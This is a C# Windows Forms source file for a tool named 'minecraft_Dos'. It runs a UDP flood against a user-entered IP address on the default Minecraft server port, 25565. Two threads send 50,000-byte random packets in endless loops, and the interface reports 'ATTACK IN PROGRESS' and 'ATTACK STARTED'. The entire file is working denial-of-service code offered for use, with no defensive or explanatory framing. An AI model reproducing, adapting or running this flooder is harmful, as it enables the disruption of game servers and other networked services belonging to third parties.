using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace minecraft_Dos
{
    public partial class Form1 : Form
    {
        Thread t = new Thread(new ThreadStart(UDP));
        public static string ip;
        Thread t1 = new Thread(new ThreadStart(UDP1));
        

        public Form1()
        {
            InitializeComponent();
        }


        private void button1_Click(object sender, EventArgs e)
        {
            
            listBox1.Items.Add("ATTACK IN PROGRESS");
            try
            {
                t.Start();
                t1.Start();
                listBox1.Items.Add("ATTACK STARTED");
            }
            catch
            {
                listBox1.Items.Add("ERROR");
            }
            


        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            ip = textBox1.Text;           
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (t != null)
            {
                if (t1 != null)
                {
                    t.Abort();
                    t1.Abort();
                    Thread.Sleep(3000);
                    Application.Exit();
                }
                else
                {
                    Thread.Sleep(3000);
                    Application.Exit();
                }
                

            }
            else
            {
                listBox1.Items.Add("QUITTING;");
            }
            
        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            
        }
        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }


        private void label4_Click(object sender, EventArgs e)
        {

        }

        private static void UDP()
        {
            try
            {

                
                UdpClient client = new UdpClient();
                client.Connect(new IPEndPoint(IPAddress.Parse(ip), 25565));
                byte[] packet = new byte[50000];
                byte[] packet1 = new byte[50000];
                Random rand = new Random();
                Random rand1 = new Random();
                rand.NextBytes(packet);
                rand1.NextBytes(packet1);
                
                while (1 == 1)
                {
                    Thread.Sleep(1);
                    client.Send(packet, packet.Length);
                    client.Send(packet1, packet1.Length);
                }
            }
            catch (Exception)
            {
                Application.ExitThread();
            }
        }

        private static void UDP1()
        {
            try
            {
                UdpClient client1 = new UdpClient();
                client1.Connect(new IPEndPoint(IPAddress.Parse(ip), 25565));
                byte[] packet2 = new byte[50000];
                byte[] packet3 = new byte[50000];
                Random rand2 = new Random();
                Random rand3 = new Random();
                rand2.NextBytes(packet2);
                rand3.NextBytes(packet3);

                while(1==1)
                {
                    Thread.Sleep(1);
                    client1.Send(packet2, packet2.Length);
                    client1.Send(packet2, packet2.Length);
                }
            }
            catch
            {
                Application.ExitThread();
            }
        }
    }
}
